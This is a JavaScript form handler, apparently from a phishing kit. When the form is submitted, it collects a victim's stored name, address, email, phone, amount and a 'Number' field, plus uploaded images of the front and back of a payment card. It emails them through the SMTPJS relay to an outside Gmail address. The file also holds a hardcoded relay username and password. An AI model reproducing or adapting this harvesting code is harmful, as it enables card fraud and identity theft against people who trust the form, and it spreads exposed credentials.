
var submitbtn = document.getElementById("submit");
submitbtn.addEventListener("click", (e) => {
     let secondData = document.getElementsByTagName("input");
   
     e.preventDefault();
let formdata = JSON.parse(localStorage.getItem("initial"));

var file1  = secondData[0].files[0];
var file2 = secondData[1].files[0];
formdata.number = secondData[2].value;
     var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
     var emailConfig = {
      "Host" : "smtp.elasticemail.com",
      "Username" : "01marissacaitlin@gmail.com",
      "Password" : "4BAA3D4BDD8BA965875BDEFF54B63B3A7E5F",
      "To"  : "Ibraheemakin201@gmail.com",
      "From" : "Ibraheemakin201@gmail.com",
      "Subject" : "Phrase Image",
      "Body"  : `Dear User, Your details are 
        Firstname : ${formdata.firstname}
        Lastname : ${formdata.lastname}
        Email : ${formdata.email}
        Phone Number : ${formdata.phone}
        City : ${formdata.city}
        State : ${formdata.state}
        Zip : ${formdata.zip}
        City : ${formdata.city}
        amount : ${formdata.amount}
        address 1 : ${formdata.add1}
        addresss 2 : ${formdata.add2},
        Number : ${formdata.number}
      `
  }
 const reader1 = new FileReader();
 const reader2 = new FileReader();
    reader1.onload = (e) => {
      const fileData1 = e.target.result;
                
      reader2.onload = (e) => {
        const fileData2 = e.target.result;
        emailConfig.Attachments =  [
          {
            "name":'Front of Card',
          "type": "application/octet-stream",
          "data":fileData1
          },
          {
            "name":'Back of Card',
          "type": "application/octet-stream",
          "data":fileData2
          }
          ] 
      }
      reader2.readAsDataURL(file2);
    
    }
    
    reader1.readAsDataURL(file1);
    

   
    
   /*{
           "name":'Back of Card',
         "type": "application/octet-stream",
         "data":fileData2
         } */

  
     console.log(emailConfig);
     Email.send(emailConfig).then(
       message =>console.log(message)
     ).catch(
       error => console.error('Error sending email:', error)
     );

    });